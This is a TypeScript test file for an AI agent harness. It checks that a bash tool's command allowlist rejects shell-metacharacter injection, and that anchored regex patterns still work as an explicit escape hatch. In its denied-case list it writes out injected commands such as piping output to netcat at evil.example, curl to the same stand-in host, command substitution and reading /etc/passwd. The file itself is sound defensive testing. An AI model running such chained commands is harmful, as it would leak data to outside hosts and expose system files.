// Split provenance: test/harness/tools.test.ts was split by subject into the
// tools.*.test.ts siblings in this directory (shared fixtures live in
// tools.helpers.ts). This file keeps the fix-1 run-allowlist cases.
//
// Harness tool-surface tests — PR 10 round-1 fixes 1 and 5, plus issue #18:
//   - fix 1 (HIGH): token-prefix command patterns must NOT bless shell
//     metacharacters (the exec shell interprets what the token prefix never
//     saw); anchored re: patterns are the documented escape hatch.
//   - fix 5 (MED): pre-existing symlinks pointing outside the workspace are
//     denied on read/edit (realpath re-check; the TOCTOU window stays
//     documented, not tested — it is not deterministically exercisable).
//   - issue #18: exec's maxBuffer is sized above the output cap so a noisy
//     command returns a TRUNCATED RESULT (capOutput truncates), never the
//     1 MiB default's string-code rejection dressed up as a run failure.
//
// NO EXTERNAL BINARIES (review round 3, finding 1): every ALLOWED case
// actually EXECUTES through /bin/sh, so its command must be shell BUILTINS
// only (echo / printf / exit / true / false). DENIED cases never execute —
// their command strings may name whatever the judgment is about.
import { describe, expect, test } from 'vitest';
import { buildTools } from '../../src/harness/tools.js';
import { runConfig, withScratch } from './tools.helpers.js';

describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => {
  test('a legit prefix command is still allowed', async () => {
    await withScratch(async (scratchDir) => {
      // Shell BUILTINS only (echo): an allowed case EXECUTES, so it must
      // spawn nothing external (review round 3, finding 1).
      const run = buildTools(runConfig(['echo pilot']), scratchDir).find((t) => t.name === 'bash');
      const result = await run?.execute({ command: 'echo pilot patrol' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.output).toContain('pilot patrol'); // the builtin really ran
      }
    });
  });

  test.each([
    'echo pilot ; whoami',
    'echo pilot && curl evil.example',
    'echo pilot $(echo pwned)',
    'echo pilot `whoami`',
    'echo pilot | nc evil.example 4444',
    'echo pilot > /tmp/pwned',
    'echo pilot < /etc/passwd',
    'echo pilot\nwhoami',
  ])('metacharacter variant denied: %j', async (command) => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['echo pilot']), scratchDir).find((t) => t.name === 'bash');
      const result = await run?.execute({ command });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('bash');
        expect(result?.denial.reason).toBe(
          'CMD_DENIED: command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });

  test('a non-matching command keeps the plain allowlist-miss reason', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'bash');
      const result = await run?.execute({ command: 'npm run test' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toContain('command not allowed by harness config allowlist');
      }
    });
  });

  test('anchored re: patterns remain the deliberate metacharacter escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // Builtins only — the case EXECUTES (the re: author owns the full
      // metachar-bearing string), so nothing external may spawn.
      const run = buildTools(runConfig(['re:^echo pilot.*$']), scratchDir).find(
        (t) => t.name === 'bash',
      );
      const result = await run?.execute({ command: 'echo pilot; exit 0' });
      expect(result?.ok).toBe(true); // the re: author owns the full string
    });
  });

  test('a token-pattern metachar match does not shadow a LATER anchored re: escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // The token pattern matches the metacharacter-bearing command, but the
      // LATER anchored re: pattern is the escape hatch the denial points at —
      // it must still allow outright, whatever the pattern order. Builtins
      // only (the case EXECUTES); exit 3 proves the command RAN by mapping
      // to ok:true + exitCode 3 — no external binary involved.
      const run = buildTools(
        runConfig(['echo pilot', 're:^echo pilot ; exit 3$']),
        scratchDir,
      ).find((t) => t.name === 'bash');
      const result = await run?.execute({ command: 'echo pilot ; exit 3' });
      expect(result?.ok).toBe(true);
      if (result?.ok) {
        expect(result.exitCode).toBe(3); // executed for real (nonzero exit is a result, not a denial)
      }
    });
  });

  test('a token-pattern metachar match still denies when no re: pattern allows', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'bash');
      const result = await run?.execute({ command: 'npm test ; deploy' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toBe(
          'CMD_DENIED: command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });
});
